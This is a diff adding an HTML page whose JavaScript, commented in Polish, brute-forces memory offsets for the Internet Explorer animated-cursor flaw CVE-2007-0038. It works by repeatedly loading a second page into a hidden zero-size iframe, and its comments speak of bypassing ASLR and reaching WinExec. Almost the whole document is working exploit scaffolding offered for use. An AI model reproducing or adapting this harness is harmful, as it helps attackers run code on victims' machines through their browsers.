@@ -1,0 +1,82 @@
+<html>
+<body>
+
+
+<iframe src='' id='exploit' name='exWindow' style="width:0px;height:0px;"></iframe>
+<center><div id='out' style="z-index:2;position:absolute;top:111px;left:700px"></div> <img style="z-index:9" src='minTh1.png'/></center>
+
+<script type="text/javascript">
+
+/* 
+
+Brutforce w CVE-2007-0038 to mit chyba ze wyeliminujemy 
+wszystkie lokalizacje ktore prowadza do niekontynuowalnych wyjatków 
+a to bylo by trudne zwazywszy ze ich adresy sa losowe :) lub sprawimy ¿e wyj¹tki bêd¹ kontynuowalne :D
+Chcialem to zrobic bez timerów z wykorzystaniem postMessage ale w
+tym IE nie ma postMessage lol xD xD
+
+Nied³ugo napisze cos wiecej o tym jak wkoncu wexploitowalem ten blad 
+omijajac ASLR i DEP (którego nie ma), ile bylo podejsc i dlaczego tak a nie inaczej 
+... etc
+
+//7638 32DF > 8BFF             MOV EDI,EDI   -- WinExec 1
+//7636 32DF > 8BFF             MOV EDI,EDI   -- WinExec 2
+//7637 32DF > 8BFF             MOV EDI,EDI
+
+
+
+*/
+
+  var base = 0x6000;
+  var end  = 0x8000;
+  var off  = base;
+
+  var cnt  = 0;
+
+  var eWin  = document.getElementById('exploit');
+  var out   = document.getElementById('out');
+
+  
+  function makeOffset(num) {
+
+          var ret  = '';
+          var conv = [];
+          off += num;
+
+          conv[0] = ((off >> 32 ) & 0xff)
+          conv[1] = ((off >> 8) & 0xff);
+      
+          var tmp = 0;
+          if(conv[0] <= 0x0f) tmp = '0'+conv[0].toString(16).slice(-2);
+          else tmp = conv[0].toString(16);
+          ret = '%u'+conv[1].toString(16) + tmp;
+
+          return ret;
+  }
+
+  function run(num) {
+   
+        window.call_me = makeOffset(num);
+        out.innerHTML  = '<h1>' + window.call_me + '</h1>';
+
+  }
+
+  function spawn() {
+  
+     if(base + cnt >= end) {
+        alert('Koniec ');
+        return;
+     }
+     run(cnt);     
+     ++cnt;
+
+     eWin.src = 'jo.html';
+  }
+
+
+  setInterval('spawn();',1000);
+
+</script>
+
+</body>
+</html>
